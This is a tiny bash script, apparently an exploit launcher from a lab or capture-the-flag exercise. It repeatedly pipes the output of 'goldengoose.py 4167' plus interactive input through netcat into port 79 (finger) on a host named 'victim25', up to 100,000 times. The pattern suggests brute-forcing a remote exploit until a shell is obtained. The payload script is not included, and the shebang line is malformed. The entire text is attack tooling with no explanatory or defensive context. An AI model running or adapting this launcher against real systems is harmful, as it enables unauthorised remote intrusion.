!/bin/bash
END=100000
for ((i=1;i<=END;i++));
do
   (python3 goldengoose.py 4167 && cat) | nc victim25 79
done

